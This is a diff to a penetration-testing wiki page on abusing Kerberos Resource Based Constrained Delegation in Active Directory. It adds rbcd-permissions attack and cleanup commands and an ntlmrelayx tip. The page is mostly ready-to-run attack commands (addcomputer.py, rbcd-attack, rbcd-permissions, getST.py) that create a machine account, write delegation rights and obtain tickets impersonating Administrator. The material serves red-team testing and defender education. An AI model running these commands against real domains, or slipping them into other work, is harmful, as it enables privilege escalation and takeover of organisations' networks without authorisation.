@@ -130,14 +130,14 @@ Once the ticket is injected, it can natively be used when accessing the service 
 
 ### Resource Based Constrained Delegations \(RBCD\)
 
-If an account, having the capability to edit the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of another object \(e.g. the `GenericWrite` ACE, see [Abusing ACLs](../abusing-aces/)\), is compromised, an attacker can use it populate that attribute, hence configuring that object for RBCD.
+If an account, having the capability to edit the `msDS-AllowedToActOnBehalfOfOtherIdentity` security descriptor of another object \(e.g. the `GenericWrite` ACE, see [Abusing ACLs](../abusing-aces/)\), is compromised, an attacker can use it populate that attribute, hence configuring that object for RBCD.
 
 Then, in order to abuse this, the attacker has to control the computer account the object's attribute has been populated with.
 
 In this situation, an attacker can obtain admin access to the target resource \(the object configured for RBCD in the first step\).
 
 1. Create a computer account leveraging the `MachineAccountQuota` setting
-2. Populate the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of another object with the machine account created, using the credentials of a domain user that has the capability to populate attributes on the target object \(e.g. `GenericWrite`\).
+2. Populate the `msDS-AllowedToActOnBehalfOfOtherIdentity` security descriptor of another object with the machine account created, using the credentials of a domain user that has the capability to populate attributes on the target object \(e.g. `GenericWrite`\).
 3. Using the computer account credentials, request a ticket to access the target resource
 
 {% tabs %}
@@ -148,10 +148,20 @@ The [Impacket](https://github.com/SecureAuthCorp/impacket) script [addcomputer](
 addcomputer.py -computer-name 'SHUTDOWN$' -computer-pass 'SomePassword' -dc-host $DomainController -domain-netbios $DOMAIN 'DOMAIN\anonymous:anonymous'
 ```
 
-The [rbcd-attack](https://github.com/tothi/rbcd-attack) script \(Python\) can be used to modify the delegation rights \(populate the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute\), using the credentials of a domain user
+The [rbcd-attack](https://github.com/tothi/rbcd-attack) script \(Python\) can be used to modify the delegation rights \(populate the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` security descriptor\), using the credentials of a domain user. 
 
 ```bash
-rbcd-attack -f SHUTDOWN -t $Target -dc-ip $DomainController 'DOMAIN\anonymous:anonymous'
+rbcd-attack -f 'SHUTDOWN' -t $Target -dc-ip $DomainController 'DOMAIN\anonymous:anonymous'
+```
+
+The [rbcd permissions](https://github.com/NinjaStyle82/rbcd_permissions) script \(Python\) is an alternative to rbcd-attack but can also do pass-the-hash, pass-the-ticket, and operate cleanup of the security descriptor.
+
+```bash
+# Attack (example with user/password)
+rbcd-permissions -c 'CN=SHUTDOWN,OU=Computers,DC=DOMAIN,DC=LOCAL' -t 'CN=TARGET,OU=Computers,DC=DOMAIN,DC=LOCAL' -d $DOMAIN_FQDN -u $USER -p $PASSWORD -l $LDAPSERVER
+
+# Cleanup
+rbcd-permissions --cleanup -c 'CN=SHUTDOWN,OU=Computers,DC=DOMAIN,DC=LOCAL' -t 'CN=TARGET,OU=Computers,DC=DOMAIN,DC=LOCAL' -d $DOMAIN_FQDN -u $USER -p $PASSWORD -l $LDAPSERVER
 ```
 
 The [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) \(Python\) can then perform all the necessary steps to obtain the final "impersonating" TGS \(in this case, "Administrator" is impersonated but it can be any user in the environment\).
@@ -161,7 +171,7 @@ getST.py -spn $target_SPN -impersonate Admnistrator -dc-ip $DomainController 'DO
 ```
 
 {% hint style="warning" %}
-In some mysterious cases, using [addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py) to create a computer account resulted in the creation of a **disabled** computer account.
+In some mysterious cases, using [addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py) to create a computer account resulted in the creation of a **disabled** computer account. Testers can use ntlmrelayx instead and use `--add-computer`, like [this](https://arkanoidctf.medium.com/hackthebox-writeup-forest-4db0de793f96).
 {% endhint %}
 
 Impacket's ntlmrelayx can also conduct an RBCD abuse with the `--delegate-access` option \(see [NTLM relay](../abusing-ntlm/ntlm-relay.md)\).
